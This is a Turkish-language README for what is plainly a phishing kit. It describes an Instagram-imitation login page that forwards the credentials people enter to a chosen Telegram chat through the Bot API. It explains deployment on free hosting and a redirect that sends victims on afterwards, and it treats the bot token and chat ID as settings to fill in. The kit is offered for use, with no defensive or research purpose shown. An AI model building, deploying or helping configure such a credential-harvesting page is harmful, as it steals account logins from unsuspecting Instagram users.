# Instagram Clone Login - Telegram Entegrasyonu

Bu proje, Instagram benzeri bir giriş sayfası sağlayan ve girilen kullanıcı bilgilerini Telegram aracılığıyla belirtilen bir sohbete gönderen bir web uygulamasıdır.

## Özellikler

- Instagram benzeri kullanıcı arayüzü
- Telegram Bot API entegrasyonu
- Form gönderimi sonrası özelleştirilebilir yönlendirme 
- InfinityFree gibi ücretsiz PHP hosting platformlarında çalışabilme
- Farklı deployment seçenekleri (statik, Node.js veya PHP)

## Proje Yapısı

Proje içerisinde üç farklı deployment seçeneği bulunmaktadır:

1. **Static Version (static_version_instagram_clone.zip)**
   - Sadece HTML, CSS, JavaScript ve PHP proxy içerir
   - Basit web sunucularında çalışabilir
   
2. **InfinityFree Package (infinityfree_instagram_clone.zip)**
   - InfinityFree hosting için özel olarak yapılandırılmış
   - /htdocs klasör yapısına uygun

3. **Deploy Package (deploy_package_instagram_clone.zip)**
   - Node.js destekli sunucular için
   - Netlify, Vercel gibi platformlarda çalışabilir

## Kurulum

Detaylı kurulum talimatları için `KURULUM.md` dosyasına bakınız.

### Hızlı Kurulum (StaticVersion)

1. `static_version_instagram_clone.zip` paketini indirin
2. ZIP dosyasını açın
3. Tüm dosyaları web sunucunuzun kök dizinine yükleyin
4. Web tarayıcınızda test edin

## Özelleştirme

- `telegram.js` dosyasındaki `REDIRECT_URL` değişkenini değiştirerek, form başarıyla gönderildikten sonra kullanıcının yönlendirileceği URL'i özelleştirebilirsiniz
- Telegram bot token ve chat ID değerlerini güncelleyebilirsiniz

## Teknik Detaylar

- Telegram Bot API entegrasyonu için direkt REST API çağrıları kullanılmaktadır
- PHP proxy, API isteklerini aracı olarak iletmek için kullanılır (CORS hatalarını önler)
- Responsive tasarım tüm cihazlarda düzgün görüntülenmeyi sağlar

## Sorun Giderme

- CORS hataları için `proxy.php` dosyasının sunucuda çalıştırılabilir olduğundan emin olun
- Telegram botunun token ve chat ID değerlerini doğrulayın
- InfinityFree hosting kullanırken sorunlarla karşılaşırsanız `INFINITYFREE_KURULUM.md` dosyasına bakınız

## Katkıda Bulunma

Proje geliştirmeleri ve hata düzeltmeleri için pull request gönderebilirsiniz.